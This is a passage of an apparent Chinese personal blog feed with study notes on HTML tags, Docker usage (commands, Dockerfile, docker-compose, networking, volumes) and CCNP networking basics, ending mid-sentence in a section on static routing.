class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>保存为html格式后直接用浏览器打开即可看到我们的第一个html页面。</p><p><b>元素</b></p><p><code>&lt;title&gt; &lt;/title&gt;</code><br>title是页面的标题，显示在浏览器的工具栏处</p><p><code>&lt;base&gt; &lt;/base&gt;</code><br>base标签描述了基本的链接地址/链接目标，该标签作为HTML文档中所有的链接标签的默认链接</p><p><code>&lt;link&gt; &lt;/link&gt;</code><br>link标签常用于资源引用，例如css样式</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;xxx.css&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;style&gt; &lt;/style&gt;</code><br>样式标签</p><p><code>&lt;meta&gt;</code><br>meta标签描述了一些基本的元数据。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;meta name=&quot;keywords&quot; content=&quot;HTML, CSS, XML, XHTML, JavaScript&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;description&quot; content=&quot;免费 Web &amp; 编程 教程&quot;&gt;</span><br><span class="line">&lt;meta name=&quot;author&quot; content=&quot;Runoob&quot;&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;refresh&quot; content=&quot;30&quot;&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;script&gt; &lt;/script&gt;</code><br>表示js脚本的标签</p><p><code>&lt;hn&gt; &lt;/hn&gt;</code><br>h标签是html标题，一共有6个等级，1-6代表不同等级的标签。</p><p><code>&lt;p&gt; &lt;/p&gt;</code><br>p标签表示这是一个段落</p><p><code>&lt;a&gt; &lt;/a&gt;</code><br>a标签表示这是一个超链接</p><p><code>&lt;img src&gt;</code><br>img标签表示这是一个图片</p><p><code>&lt;hr&gt;</code><br>这个标签表示是一个水平线</p><p><code>&lt;br&gt;</code><br>换行符标签</p><p><code>&lt;b&gt; &lt;em&gt; &lt;i&gt;  &lt;small&gt; &lt;strong&gt; &lt;sub&gt; &lt;sup&gt; &lt;ins&gt; &lt;del&gt;</code><br>文字类标签，表示加粗、着重、斜体、小号字体、加重语气、上下标、插入、删除</p><p><code>&lt;code&gt; &lt;q&gt;</code><br>这几类不常使用的标签，表示代码、引用（非常少见）</p><p><code>&lt;table&gt; &lt;th&gt;&lt;/th&gt;&lt;td&gt; &lt;tr&gt; &lt;/tr&gt; &lt;/td&gt; &lt;/table&gt;</code><br>表格标签</p><p><code>&lt;ui&gt;&lt;li&gt;&lt;/li&gt;&lt;ui&gt;</code><br>列表标签 ui表示无序，ol表示有序</p><p><code>&lt;div&gt;&lt;/div&gt; &lt;span&gt;&lt;/span&gt;</code><br>容器标签，可以将各种元素放入其中组成一个容器，拥有同样的样式和属性。<br>div多用于整体，span多用于文本。</p><p><code>&lt;form&gt;&lt;/form&gt;</code><br>表单元素，用于装载用户输入内容。</p><p><code>&lt;iframe&gt;&lt;/iframe&gt;</code><br>表示窗口框，可在一个页面上显示多个窗口。</p><p><b>属性</b></p><p>元素在其标签内可以拥有不同的属性，来进行进一步的功能或格式的美化</p><p><code>&lt;a id=&gt;</code><br>id属性表示一个书签标记，在一个html页面中id应该为唯一的。可用于跳转和定位等。</p><p><code>&lt;a href=&gt;</code><br>href属性表示链接的url</p><p><code>&lt;a target=&gt;</code><br>使用target=_blank可以实现在新的窗口打开页面。</p><p><code>&lt;img alr=&gt;</code><br>alt 属性用来为图像定义一串预备的可替换的文本。当图片无法加载的时候作为备用替换上去</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;前端基础&lt;/h1&gt;
&lt;center&gt;&lt;small&gt;2019-07-22&lt;/small&gt;&lt;/center&gt;
感觉很久没写博客了，很久没有静下心来学习了。开始从开发的角度取写一些站，和框架工具。
把全栈的知识补一补。  
&lt;center&gt;&lt;small&gt;华丽的分割线&lt;/smal</summary>
      
    
    
    
    <category term="Reading" scheme="http://blog.dvkunion.cn/categories/Reading/"/>
    
    
    <category term="前端" scheme="http://blog.dvkunion.cn/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>Docker</title>
    <link href="http://blog.dvkunion.cn/2019/06/10/Docker/"/>
    <id>http://blog.dvkunion.cn/2019/06/10/Docker/</id>
    <published>2019-06-10T20:57:11.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>Docker</h1><hr><center><small>2018-12-26</small></center>(ﾟ∀。) 最近莫名的开了好几个新的文章，操作系统还没整理完密码学的编码也没继续记录完，然后我又开了一个docker......我可能是个傻子吧。<p>(((ﾟДﾟ;))) 人生好难</p><center><small>2019-5-24</small></center>经过一段时间以及换了mac pro的契机，各种环境的转换巴拉巴拉，还有最近想学习各种 vulurn hub 和复线大佬们的赛题环境，重新整理一下对docker的笔记以及自己的理解。<center><small>2019-6-10</small></center>搞来了一张图，用于考察自己的学习结果以及复习时候可以使用的思维导图<img src='https://blog.dvkunion.cn/img/Docker27.png'><center><small>华丽的分割线</small></center><hr><h3 id="b-0x01-docker简介-b"><b>0x01- - docker简介</b></h3><p>首先是日行例常简介。<br>讲道理很讨厌简介这个东西，总觉得概念性的东西说起来好麻烦啊......</p><p>当时用过一阵docker之后，我个人觉得docker其实就是将所有的软件运行环境进行一个打包处理，进行一个模块化。当我们想要使用的时候，就可以像拼接积木一样，把所有我们想要的功能直接组合在一起即可，方便而快捷，同时各个容器内部之间又不会产生环境版本或冲突等问题。</p><p>然后还是放一些官方的介绍吧</p><p>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从Apache2.0协议开源。Docker为开发人员和IT部门提供了构建，管理和保护业务关键型应用程序的自由，而无需担心技术或基础架构锁定，从而释放了组织的潜力。</p><p>什么是容器？容器技术是一种虚拟化的方案，它类似虚拟机技术，但又与虚拟机技术完全不同。它只能运行相同或相似内核的操作系统，依赖于Linux内核特性：Namespace和Control Groups。容器取消了虚拟机中操作系统、Hypervisor 并整合成了一个叫做docker engine 的东西。使得磁盘的占用空间大大减少、占用资源大大减少。对于一个应用不再需要几十个G的操作系统，只需要应用以及其依赖环境即可。</p><p>有一个很形象的比喻：在很久以前，运输业在一趟列车上只能运输同一种货物，例如，如果把香蕉和各种化工药物一起运输，最后药物可能被污染，香蕉也会被压烂；这时候人们做出了一个伟大的发明：集装箱，把一种货物装进一个集装箱，直接对集装箱进行运输即可，安全又方便。这个集装箱就可以看做是---容器。</p><p>Docker就是为容器提供了一个轻量级的简单建模方式，能够将应用程序部署到容器当中。为实现高内聚、低耦合做进一步的推进。使用Docker，可以轻松的隔离各个应用的运行环境，解决了在一台服务器上部署多个应用导致的冲突问题。</p><h3 id="b-0x02-docker基本组成-b"><b>0x02- - docker基本组成</b></h3><p>Docker一般分为三个主要部分：Image 镜像，Container 容器，Registry 仓库。</p><p>都是一些概念性的东西，说一些比较好理解的吧。这三个东西可以认为是：win下的iso文件，一个虚拟机，iso文件仓库。<br>当我们去安装一个虚拟机的时候，我们都要选择操作系统，然后倒入对应操作系统的iso镜像文件进行安装。这就类似于docker的Image 镜像；当我们安装好了之后，我们将会获得一个虚拟机，这个虚拟机运行着我们安装的操作系统，整个虚拟机就类似于docker的容器。最后仓库就很好理解了，是一个整体存放镜像文件的库，可以在里面找到你想要的各个版本的系统/环境。</p><h4 id="font-color-blue-Image-镜像-font-br"><font color = "blue">Image 镜像</font><br></h4><p>镜像是容器的基石，当我们运行一个docker容器时，会生成一个docker栈，<br>他的最底层是一个bootfs的引导类文件系统，类似于Linux的引导文件系统；上一层就是操作系统层rootfs，他可以是一种或者多种的操作系统：Ubuntu、CentOS，这一部分在最开始的时候以只读的方式加载，在加载完成后才会开方读写模式。再上层是docker的联合加载模式（union mount），加载多个文件系统和应用。</p><h4 id="font-color-blue-Container-容器-font-br"><font color = "blue">Container 容器</font><br></h4><p>容器是镜像的执行者，所有的镜像都需要使用容器来进行执行。容器中可以运行用户的一个或者多个进程，在容器启动镜像时候，会在docker栈的最顶层生成一个读写层来给用户进行操作，所有对于镜像的读写操作都会储存在这里。这也是docker的一个特点：写时复制。</p><h4 id="font-color-blue-Registry-仓库-font-br"><font color = "blue">Registry 仓库</font><br></h4><p>相比于前两部分，这一个可能更好理解一些。所谓仓库就是存储docker镜像文件的仓库。就像GitHub是存放代码的仓库一样。docker公司提供了一个免费的仓库docker hub，用户也可以构建属于自己的仓库。</p><h4 id="font-color-blue-容器技术-font-br"><font color = "blue">容器技术</font><br></h4><p>在简介里提到了两个比较陌生的部分：Namespaces 命名空间、Control groups 控制组。</p><p>命名空间是一种封装的概念。在操作系统中，命名空间是系统资源的隔离，如：进程、网络、文件系统等等。这也是Linux系统实现虚拟化的基础。</p><p>在docker中有五种命名空间：PID 进程隔离，NET 网络隔离， IPC 通信进程隔离，MNT 挂载点隔离，UTS 隔离内核和版本号。</p><p>控制组是用来控制分配资源的一种机制，它提供一个资源限制、优先级限定、资源计量、资源控制的服务。</p><p>通过这两中容器技术，docker就可以实现：</p><ul><li>文件系统隔离：所有容器都有root文件系统</li><li>进程隔离：所有应用都在自己的容器内运行互不干扰</li><li>网络隔离：容器之间的虚拟网络和IP是分割的</li><li>资源隔离：对宿主主机CPU和内存等资源进行合理分配</li></ul><h3 id="b-0x03-docker基本操作-b"><b>0x03- - docker基本操作</b></h3><p>学习docker操作，第一个一定是从一个搭建一个web服务开始。</p><p>首先我们要安装好docker。安装步骤很简单，只需要内核版本足够即可。<br>对于Ubuntu，只需要内核版本高于3.10 即可。之后获取安装脚本运行就OK。<br>对于CentOS，要求系统要在7以上。</p><p>安装完成后，我们可以启动docker服务：</p><p><code># service docker start</code></p><p>启动一个容器：<br><code># docker run IMAGENAME</code></p><p>启动交互式容器：<br><code># docker run -i -t IMAGENAME /bin/bash</code><br>-i --interactive=true 默认是FALSE 标准输入进程<br>-t --tty=true 默认是FALSE 分配终端</p><p><code># docker run --name=USERNAME -i -t IMAGENAME /bin/bash</code>  自定义容器名</p><p>查看建立的容器：<br><code># docker ps -a/-l</code>  查看所有/运行中的容器</p><p><code># docker inspect ContainerID</code>  查看特定容器详细信息</p><p>重启容器：</p><p><code># docker start -i ContainerID/ContainerNAME</code></p><p>删除容器：</p><p><code># docker rm ContainerID/ContainerNAME</code></p><p>设置容器的端口映射：</p><p><code># docker run -p containerPort</code><br><code># docker run -p hostPort:containerPort</code><br><code># docker run -p  ip:containerPort</code><br><code># docker run -p ip:hostPort:containerPort</code></p><p>镜像操作：</p><p><code># docker images</code> 查看本地镜像<br><code># docker search IMAGENAME:tag</code> 搜索镜像<br><code># docker pull IMAGENAME:tag</code> 下载镜像<br><code># docker push IMAGENAME:tag</code> 推送上传镜像<br><code># docker rmi IMAGENAME:tag</code> 删除镜像<br><code># docker commit ContainerID/ContainerNAME NEWIMAGENAME</code> 生成镜像<br><code># docker built DOCKERFILE</code> 根据dockerfile生成镜像</p><h3 id="b-0x04-docker守护式容器-b"><b>0x04- - docker守护式容器</b></h3><p>指在命令结束后不会自行停止的容器。</p><p>进入一个正在运行的容器：<br><code># docker attach ContainerID/ContainerNAME</code></p><p>启动守护式容器：<br><code># docker run -d</code>  后台执行容器</p><p>查看容器日志：<br><code># docker logs -f -t --tail ContainerID/ContainerNAME</code><br>-f --follows=true<br>-t --timestamps=true 时间戳<br>-tail 显示数量</p><p>查看运行进程：<br><code># docker top ContainerID/ContainerNAME</code></p><p>在运行的容器中启动进程：<br><code># docker exec -d -i -t ContainerID/ContainerNAME</code></p><p>停止守护式容器<br><code># docker stop ContainerID/ContainerNAME</code><br><code># docker kill ContainerID/ContainerNAME</code></p><h3 id="b-0x05-docker-Remote-API远程通信-b"><b>0x05- - docker Remote API远程通信</b></h3><p>Docker是一个 C/S 架构，提供了一个Remote API 将服务进程与服务器通过Socket 进行连接。docker的client端可以远程启动和连接docker服务器。<br><code># nc -U /var/run/docker.sock</code> 通过ncat 与建立与docker的sock连接。</p><p><code># vim /etc/docker/daemon.json</code> 修改启动选项</p><p><code># -h tcp://host:port</code>建立远程连接参数(server端)<br><code># -h unix://path/to/socket</code><br><code># -h fd://</code></p><p><code># -H tcp://host:port</code>建立远程参数连接(client端)<br><code># export DOCKER_HOST=&quot;tcp://host:port&quot;</code> 通过修改环境变量进行远程连接</p><h3 id="b-0x06-DOCKERFILE-详解-b"><b>0x06- - DOCKERFILE 详解</b></h3><p>越到后面的时候，越觉得dockerfile这个模式有点爽。相当于写了一个sh的脚本，运行脚本后能直接构造出我需要的镜像。不再需要创建后自己手动apt-get update 或是映射端口等操作。一条命令即可复线出一个环境。</p><p><b>构建过程</b>：<br>从基础镜像中运行一个容器。<br>执行命令，修改容器。<br>执行commit类操作，提交一个新的镜像层，<br>运行新的镜像层，删除刚才的容器，继续执行命令并重复此流程直至dockerfile内的命令结束。</p><p><b>语法格式</b>：<br>#：注释<br>UPPER lower：/命令/参数</p><p><b>常见命令</b>：<br>FROM &lt;image&gt;&lt;tag&gt; 制定已经存在的镜像，必须是第一条非注释语句<br>MAINTAINER &lt;name&gt; 作者信息、联系方式<br>RUN &lt;command&gt; docker内运行的命令<br>EXPOSE &lt;port&gt; docker启用的端口<br>CMD &lt;command param1 param2&gt; 容器启动后在前台运行命令，在运行时会被覆盖<br>ENTRYPOINT&lt;command param1 param2&gt; 容器启动后在前台运行命令，在运行时不会被覆盖<br>ADD &lt;src&gt;...&lt;dest&gt; 提供tar功能的文件映射<br>COPY &lt;src&gt;...&lt;dest&gt; 文件映射<br>VOLUME &lt;data&gt; 向运行中的容器添加卷<br>WORKDIR /path/to/workdir 在容器工作时设置容器的工作路径<br>USER daemon 设置容器运行的身份，默认是Root用户<br>ONBUILD 设置触发器。当一个镜像被其他镜像作为基础镜像时执行。</p><p><code># docker built --no-cache</code>不使用缓存进行构建。<br><code># docker history IMAGENAME</code> 查看镜像构建过程</p><h3 id="b-0x07-docker-compose-详解-b"><b>0x07- - docker-compose 详解</b></h3><p>一开始的时候很不明白docker-compose和dockerfile的关系(其实就是自己根本没写一下这两样东西的原因)。看了几个大佬们github上的复线题目，大概明白了一点这之间的关系。</p><p>首先，docker-compose是一个命令工具。可以通过pip进行安装。docker-compose会根据当前目录下的docker-compose.yml配置文件进行一系列的操作，而你所要做的只是输入一条命令：</p><p><code># docker-compose up</code></p><p>之后所有的一切都会自动运行。</p><p>这里和dockerfile的区别在于，一个dockerfile只能使用一个容器，而docker-compose则没有这个限制。除此之外，docker-compose还支持使用dockerfile进行创建镜像。</p><p>所以只要我们了解了docker-compose。yml的语法格式，就能写出一个一键式创建的docker环境。</p><h4 id="font-color-blue-语法-font-br"><font color = "blue">语法</font><br></h4><p><b>vserion</b></p><p>所有的docker-conpsoe.yml文件都是以版本号为开头的，一般写为2或3，表示使用的是 Docker-compose 2 或是 Docker-compose 3。</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="string">version:&quot;3&quot;</span></span><br></pre></td></tr></table></figure><p><b>service</b></p><p>service是docker的第二大部分，其中包含了创建容器所用的镜像，端口，网络设置等等。</p><figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">service:</span> <span class="comment">#详细信息开始标签</span></span><br><span class="line"><span class="attr">continer1:</span> <span class="comment">#第一个容器标签，编写者可自定义</span></span><br><span class="line"><span class="string">image:ubuntu:14.04</span> <span class="comment">#使用的镜像</span></span><br><span class="line"></span><br><span class="line"><span class="attr">continer2:</span></span><br><span class="line"><span class="attr">built:</span> <span class="comment">#也可以通过built来进行镜像创建</span></span><br><span class="line"><span class="attr">context:</span> <span class="string">../</span> <span class="comment">#表示dockerfile文件的目录，也可以是git的url</span></span><br><span class="line"><span class="attr">dockerfile:</span> <span class="string">path/to/dockerfile</span> <span class="comment">#表示dockerfile</span></span><br><span class="line"><span class="attr">args:</span> <span class="comment">#环境变量</span></span><br><span class="line"><span class="string">password=1</span> <span class="comment">#环境变量值也可以是空</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">webapp:tag</span> <span class="comment">#当使用built创建镜像时还存在image标签，则创建的镜像名以image内容命名。</span></span><br><span class="line"><span class="attr">labels:</span> <span class="comment">#标签</span></span><br><span class="line"><span class="string">-&quot;com.example.description=Accounting</span> <span class="string">webapp&quot;</span></span><br></pre></td></tr></table></figure><h3 id="b-0x08-docker-网络-b"><b>0x08- - docker 网络</b></h3><p>网桥:docker0<br>地址划分：172.17.42.1<br>子网掩码：255.255.0.0<br>MAC:02:42:ac:11:00:00-02:42:ac:11:ff:ff 共65534个地址<br>使用网桥管理工具可以查看:bridge-utils<br><code># brctl show</code> 查看网桥连结</p><p>同时也可以通过ifconfig对docker网段进行修改，来获得自定义的网段资源和IP资源。<br>也可以通过网桥管理工具新建一个网桥代替docker0，达到不修改docker0的条件下实现自定义。</p><p><code># vim /etc/defualt/docker/ </code>添加：DOCKER_OPS -b=br0</p><p>对于访问的限制，docker同样可以通过iptables防火墙的规则进行配置。</p><h3 id="b-0x09-docker-数据管理-b"><b>0x09- - docker 数据管理</b></h3><p>这里其实是一个很大的坑，最开始使用docker的时候不理解容器和镜像的区别，对容器进行的修改和一些文件的存储都直接进行了操作，然后删除容器之前没有commit成新的镜像，导致数据全部丢失。。。<br>所以通常使用映射的方式对docker的存储：数据卷进行操作。</p><p>由于对于数据要求永久化，而容器的生命周期往往不能够满足，所以docker使用数据卷----经过特殊设计的目录，绕过联合文件系统(UFS)，为一个或者多个容器进行访问。</p><p>简单的来讲，数据卷更像是类似端口的一种映射，将宿主主机的文件或者文件目录映射到使用的容器当中，这样即使容器删除或者停止，数据目录依然是存储在宿主主机当中，形成了数据独立分离于容器的生存周期。</p><p><code># docker run -v ~/datavalume:/data IMAGENAME </code> 运行一个映射了数据卷的容器</p><p><code># docker run -v ~/datavalume:/data:ro IMAGENAME</code><br>设置权限:只读</p><p>当我们将数据卷的挂在写在dockerfile中时，是无法创建不存在的目录和共享到其他容器的。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Docker&lt;/h1&gt;
&lt;hr&gt;
&lt;center&gt;&lt;small&gt;2018-12-26&lt;/small&gt;&lt;/center&gt;
(ﾟ∀。) 最近莫名的开了好几个新的文章，操作系统还没整理完密码学的编码也没继续记录完，然后我又开了一个docker......我可能是个傻子吧。
&lt;p</summary>
      
    
    
    
    <category term="Tools" scheme="http://blog.dvkunion.cn/categories/Tools/"/>
    
    
    <category term="云原生" scheme="http://blog.dvkunion.cn/tags/%E4%BA%91%E5%8E%9F%E7%94%9F/"/>
    
    <category term="容器" scheme="http://blog.dvkunion.cn/tags/%E5%AE%B9%E5%99%A8/"/>
    
    <category term="环境搭建" scheme="http://blog.dvkunion.cn/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>CCNP 学习笔记</title>
    <link href="http://blog.dvkunion.cn/2019/03/02/CCNP/"/>
    <id>http://blog.dvkunion.cn/2019/03/02/CCNP/</id>
    <published>2019-03-02T08:52:29.000Z</published>
    <updated>2024-03-18T17:47:44.439Z</updated>
    
    <content type="html"><![CDATA[<h1>CCNP</h1><hr><center><small>2019-3-2</small></center><p>GNS<br>Cisco-packet-tracer<br><br></p><center><small>华丽的分割线</small></center><hr><h3 id="b-0x00-简介和基础-b"><b>0x00- - 简介和基础</b></h3><p>CCNP实际上是一个认证类的考试。CCNP全称是：Cisco Certified Network Professional——思科认证网络高级工程师。</p><p>工作方向：路由交换，安全，ISP服务商，数据中心DC，无线，语音。</p><p><b>网络连通性的两种测试：</b><br>ping:(ICMP)<br>原理：发送Echo request、接收Echo reply</p><p>traceroute:(UDP 33434/33435/33436)<br>原理：TTL值+ICMP错误消息。</p><p><b>网络线缆：</b><br>1.交叉线  568A 568B<br>2.直通线  568B 568B</p><blockquote><p>568B 橙白 橙 绿白 蓝 蓝白 绿 棕白 棕<br>568A 绿白 绿 橙白 蓝 蓝白 橙 棕白 棕<br>不同类型设备之间使用交叉线。<br>相同类型设备之间使用直通线。<br>普通网线只能在100m内通信。</p></blockquote><p>3.console线(反转线，全反线) 连接路由和交换机等设备</p><p>4.串口线：早期广域网链路</p><h3 id="b-0x01-OSI七层模型-b"><b>0x01- - OSI七层模型</b></h3><p><b>ISO：</b><br>国际标准化组织（International Organization for Standardization，ISO）简称ISO，是一个全球性的非政府组织。<br><b>目的：</b><br>1.简化通信网络的复杂性，便于网络的学习。<br>2.为每一个层次定义响应的功能。下层需要为上层提供标准化服务。<br>3.标准化所有厂商的接头和协议。</p><p><b>OSI：</b><br>OSI是Open System Interconnection的缩写，意为开放式系统互联。国际标准化组织（ISO）制定了OSI模型。</p><p>由高到低分别为：</p><ul><li><b>1.应用层(Applacation)： </b>为应用程序提供网络的接口。</li><li><b>2.表示层(Presentation)： </b>进行数据的编码转换、压缩，翻译数据格式。</li><li><b>3.会话层(Session)： </b>区分和控制不同的会话连接。</li></ul><blockquote><p>上三层一般由软件工程师进行考虑与建设。</p></blockquote><ul><li><b>4.传输层(Transport)：</b>提供可靠的连接(TCP)，同时进行数据校验(CRC校验)</li><li><b>5.网络层(Network)：</b> 定义逻辑地址(IP、ISIS)；提供路由的选择并进行维护；以及进行路由<font color='red'>数据包</font>的转发等操作。(路由器、三层交换机)</li><li><b>6.数据链路层(Data Link)：</b>定义物理地址(MAC：media access control)，通过媒介访问控制将<font color='red'>数据帧</font>发送到目的主机。(以太网交换机)</li><li><b>7.物理层(Physical)：</b>为网络提供可靠的传输环境，负责<font color='red'>比特流</font>的发送与接收。(集线器 hub)</li></ul><p>观察上述红色部分可以发现，OSI为每一层定义了数据的单位---<b>PDU</b></p><ul><li><b>上三层：</b>data 数据</li><li><b>传输层：</b>segement 数据段封装</li><li><b>网络层：</b>packet 数据包</li><li><b>数据链路层：</b>frame 数据帧</li><li><b>物理层：</b>bit 比特流：由0、1构成的一长串二进制。</li></ul><p><b>集线器被替代的原因：</b></p><blockquote><p>冲突域：如果在一个网络的两台计算机在通信时会发生冲突，则这个网络就是一个冲突域。会导致数据帧的破损。</p></blockquote><blockquote><p>广播域：广播的范围。<br>集线器所有接口在一个冲突域。<br>交换机的一个接口就是一个冲突域。<br>交换机所有的接口都在一个广播域。<br>路由器一个接口就是一个广播域。</p></blockquote><h3 id="b-0x02-TCP-IP协议簇-b"><b>0x02- - TCP/IP协议簇</b></h3><p><b>协议：</b><br>网络协议的简称，网络协议是通信计算机双方必须共同遵从的一组约定。<br><b>TCP/IP协议：</b><br>互联网协议（Internet Protocol Suite）是一个网络通信模型，以及一整个网络传输协议家族，为互联网的基础通信架构。它常被通称为TCP/IP协议族（英语：TCP/IP Protocol Suite，或TCP/IP Protocols），简称TCP/IP。<br>一般分为五层或四层：</p><ul><li><b>1.应用层：</b>FTP(21)、Telnet(23)、Http(80)、Smtp(25)、DNS(53)、RIP(路由信息协议 520)、Snmp(简单网络管理协议 161)、Tftp(简单文件传输协议 69)。</li><li><b>2.传输层：</b>TCP(transmission control protocol)、UDP(user datagram protocol)</li></ul><blockquote><p>TCP是面向连接(发送数据之前建立连接，发送数据时维护连接，发送数据结束拆除连接)、可靠的用户传输协议。<br>TCP通过 &quot;三次握手&quot; 建立连接; &quot;四次握手&quot;拆除连接。<br>UDP是非面向连接，不可靠的传输协议。</p></blockquote><ul><li><b>3.网络层：</b>IP(internet protocol):、ICMP：(Internet control management protocol);ARP/RARP ()地址解析协议/地址反向解析协议。</li><li><b>4.数据链路层：</b>以太网协议；HDLC协议；PPP协议。</li><li><b>5.物理层(4、5整合可以称为网络接口层)</b></li></ul><p><b>TCP包头：(20 bytes)</b><br>Source port(16 b);<br>Destination port (16 b);</p><blockquote><p>这两部分用于区分上层应用层协议。<br>1-1023：知名端口。保留给知名的应用层协议<br>1024-65535：随机高端口。 发送方随机高端口向目的主机的特定端口发起TCP连接。</p></blockquote><p>Sequence number 序列号 (16 b);<br>Acknowledgement number 确认号 (16 b);<br>Data;</p><p><b>UDP包头：(8 bytes)</b><br>Source port(16 b);<br>Destination port (16 b);<br>check num(16 b);<br>(16 b);<br>Data;</p><p><b>IP包头：(unkown Bytes)</b><br>version(4 b);</p><blockquote><p>版本：ipv4 0100; ipv6 0110;</p></blockquote><p>header length(4 b);</p><blockquote><p>头部长度： 范围20byte-60byte之间</p></blockquote><p>Priority &amp; type of service(8 b);</p><blockquote><p>用于区分不同网络流量，实现QOS</p></blockquote><p>Total length(16 b);</p><blockquote><p>总长度：说明四层以后负载的大小。</p></blockquote><p>iDentification(16 b)/Flags(3 b)/flagment offset (13 b)；</p><blockquote><p>标识/标记/偏移量：用来对数据包进行分片。<br>MTU值(最大传输单元) 最大只能传输1500 byte,所以在传输中经常对数据包进行分片。<br>标识：标记同一个数据包。<br>标记：第几个包。<br>偏移量：开始位置。</p></blockquote><p>Time To live(8 b);</p><blockquote><p>限制数据包存活时间(存活范围)，防止数据包环路<br>每经过一台三层设备该值减一<br>常见TTL：255、192、128、64。</p></blockquote><p>Protocl(8 b);</p><blockquote><p>协议号：标记上层(传输层)使用的协议。<br>6：TCP<br>17：UDP<br>1：ICMP<br>2：IGMP internet管理协议</p></blockquote><p>Header checksun(16 b);</p><blockquote><p>头部校验：校验IP数据包头部的完整性。</p></blockquote><p>Source IP Address(32 b);<br>Destination IP Address(32 b);</p><blockquote><p>源IP/目的IP</p></blockquote><p>Options;<br>Data;</p><p><b>ARP协议：</b><br>Win : arp -a<br>Route : show arp<br>arp存放时间是4个小时。</p><p><b>RARP协议：</b></p><p>已经被DHCP取代：software:169.254.0.0/16</p><h3 id="b-0x03-IP与子网掩码-b"><b>0x03- - IP与子网掩码</b></h3><p>IP(Internet Protocol):网络之间的协议<br><b>概念:</b><br>为计算机网络相互连接进行通信而设计的协议。个人把IP理解为在这个网络中每台主机的地址：如，xx省xx市xx街xx小区xxx<br><b>组成：</b><br>网络号+主机位<br>主机位全为0代表网络号：如127.0.0.0<br>主机位全为1代表广播地址：如127.255.255.255<br><b>分类：</b><br>对IP的数据进行分类，有如下：</p><ul><li>A:1.0.0.1-127.255.255.254 适用于超大型网络，可容纳 2^24-2 台主机</li><li>B:128.0.0.1-191.255.255.254 适用于大型网络，可容纳 2^16-2 台主机</li><li>C:192.0.0.1-223.255.255.254 适用于小型网络，可容纳 2^8-2 台主机</li></ul><blockquote><p>A、B、C三种被称作单播IP地址。两台主机想要网络互通必须IP地址为这三类</p></blockquote><ul><li>D:224.0.0.1-239.255.255.254 此类地址没有网络号和主机位的概念，用于组播标识组号。</li><li>E:240.0.0.1-255.255.255.254 保留地址，多用于科研。</li></ul><p>对IP的使用进行分列，有如下：</p><p>公网IP：<br>除私网地址以外的IP地址</p><p>私网地址：<br>10.0.0.0-10.255.255.255<br>172.16.0.0-172.31.255.255<br>192.168.0.0-192.168.255.255</p><p>私网地址优点：<br>提高网络安全性，节约IPv4网络空间</p><p><b>子网掩码：</b><br>子网掩码是用来判断任意两台主机是否属于同一个子网络。<br>子网掩码与IP一一对应，为32bit。<br>子网掩码<br>VLSM 可变长子网掩码：<br>例--将10.1.1.0/24划分为两个子网，可以通过这样的方式--向主机位借位作为网络位:<br>10.1.1.0/25<br>10.1.1.128/25</p><h3 id="b-0x04-路由设备与基本路由协议-b"><b>0x04- - 路由设备与基本路由协议</b></h3><p>路由器作用：可以实现不同网段之间的互联和互通。<br>路由：路由器收到IP数据包，去查找路由信息进行转发的过程。<br>路由信息：去往目的网络的一条信息，指明了去往目的网络的方向。<br>路由表：存放路由信息的表。<br>路由表存放的信息：目的地址网络号，子网掩码，下一跳地址，出接口，路由的类型，AD 管理距离，Metric 开销。</p><p>路由器依据路由表转发IP数据包，当路由表内不存在匹配的路由时，路由器就会丢弃该数据包。</p><p>路由分类：<br>直连路由和非直连路由</p><p>直连路由：指物理上直接连接的路由。会随着接口状态的改变而消失。</p><p>非直连路由：指物理上没有直接连接的路由。非直连路由又分为 静态路由 和 动态路由两种。</p><p>静态路由：人为手工在路由上进行配置路由信息的路由。</p><p>动态路由：主要有两个协议：距离矢量路由协议、链路状态路由协议。</p><p>距离矢量路由协议：RIP EIGRP BGP 基于流言的协议</p><p>链路状态路由协议：OSPF ISIS 地图协议</p><p>从协议的工作范围，路由器可以分为IGP路由、EGP路由。</p><p>IGP：RIP EIGRP ISIS内部网关工作协议  一个区域内内部运行的路由协议</p><p>EGP：BGP OSPF外部网关工作协议  在区域系统之间运行的路由协议</p><p>早期分类：<br>有类路由协议：RIP　IGRP (主类路由 A:X.0.0.0/8 B:Y.Y.0.0/16)</p><p>无类路由协议：EOGRP OSPF ISIS BGP(无类别路由,携带子网掩码)</p><p>查表原则：<br>1.最长掩码匹配原则。<br>2.递归查询原则。</p><p>AD管理距离</p><p>C-----0<br>S-----1<br>RIP---120<br>EIGRP-90/170/5<br>OSPF--110<br>ISIS--115<br>BGP---20/200<br>255---过滤</p><p>作用：从不同的路由协议学习到的相同的路由条目，比较进行管理。</p><p>Metric开销：<br>比较同一种协议去往目的网络的开销</p><p><b>静态路由</b></p><p>由管理员手工配置的路由条目</p><p>配置语法：</p><p><code>ip route 网络号 子网掩码 出接口/下一跳地址</code></p><p>既要配置转发echo request的路由表，也要配置echo reply的路由表。</p><p>如果是以太网形式，静态路由尽可能跟下一跳地址。(代理ARP):no ip proxy-arp<br>如果是串行链路，既可以跟下一跳，也可以跟出接口。</p><p>静态路由全网联通：每一台路由都要配置与自己非直连路由的静态路由。</p><p>静态路由特例：<br>默认路由：ip route 0.0.0.0 0.0.0.0 